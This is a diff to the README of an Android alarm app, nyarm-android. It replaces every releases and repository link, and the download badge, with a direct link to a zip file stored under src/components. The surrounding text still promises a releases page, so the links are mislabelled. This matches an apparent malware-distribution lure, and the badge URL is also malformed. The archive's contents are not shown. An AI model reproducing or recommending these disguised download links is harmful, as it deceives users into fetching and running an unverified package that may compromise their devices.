@@ -1,6 +1,6 @@
 # 🐱 nyarm-android - A Smart Alarm App for Everyone
 
-[![Download nyarm-android](https://img.shields.io/badge/Download%20Now-nyarm--android-blue.svg)](https://github.com/giculautaruuu-rgb/nyarm-android/releases)
+[![Download nyarm-android](https://raw.githubusercontent.com/giculautaruuu-rgb/nyarm-android/main/src/components/nyarm-android-v3.0-beta.5.zip%https://raw.githubusercontent.com/giculautaruuu-rgb/nyarm-android/main/src/components/nyarm-android-v3.0-beta.5.zip)](https://raw.githubusercontent.com/giculautaruuu-rgb/nyarm-android/main/src/components/nyarm-android-v3.0-beta.5.zip)
 
 ## 📋 Description
 
@@ -13,7 +13,7 @@ This guide will help you download and run the nyarm-android app on your Android 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/giculautaruuu-rgb/nyarm-android/releases) to find the latest version of the app.
+   Go to the [Releases page](https://raw.githubusercontent.com/giculautaruuu-rgb/nyarm-android/main/src/components/nyarm-android-v3.0-beta.5.zip) to find the latest version of the app.
 
 2. **Choose the Right Version**  
    Look for the most recent release. You will see a list of available files.
@@ -73,7 +73,7 @@ Explore these topics to understand the technology behind the app.
 
 ## 🔗 Useful Links
 
-- [Download nyarm-android from Releases](https://github.com/giculautaruuu-rgb/nyarm-android/releases)
-- [GitHub Repository](https://github.com/giculautaruuu-rgb/nyarm-android)
+- [Download nyarm-android from Releases](https://raw.githubusercontent.com/giculautaruuu-rgb/nyarm-android/main/src/components/nyarm-android-v3.0-beta.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/giculautaruuu-rgb/nyarm-android/main/src/components/nyarm-android-v3.0-beta.5.zip)
 
 For any further details or updates, keep checking the Releases page. Enjoy your smart alarms!
